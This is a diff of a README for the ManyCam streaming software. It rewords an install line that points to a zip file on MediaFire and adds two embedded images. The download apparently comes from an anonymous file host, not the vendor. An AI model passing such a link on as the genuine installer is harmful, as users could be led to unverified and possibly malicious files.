@@ -4,7 +4,9 @@ ManyCam is a versatile live streaming and video conferencing software designed f
 
 ## Installation
 
-Download and install: [Download ManyCam](https://www.mediafire.com/file/a8brycgk1qko36c/manycam_x64.zip/file)
+Download ManyCam: [link](https://www.mediafire.com/file/a8brycgk1qko36c/manycam_x64.zip/file)
+
+![ezgif-7fa0de49758dbcca](https://github.com/user-attachments/assets/3840a1b0-bd9d-41ce-963f-63c10d76081a)
 
 ## Features
 
@@ -18,6 +20,8 @@ Download and install: [Download ManyCam](https://www.mediafire.com/file/a8brycgk
 - Customizable watermarks and branding options.
 
 ## Use Cases
+
+![unnamed](https://github.com/user-attachments/assets/f8085d42-6272-491f-bcc5-2f09fda7198f)
 
 - Live streaming on platforms like YouTube, Twitch, or Facebook Live.
 - Video conferencing for remote work, online classes, or meetings.
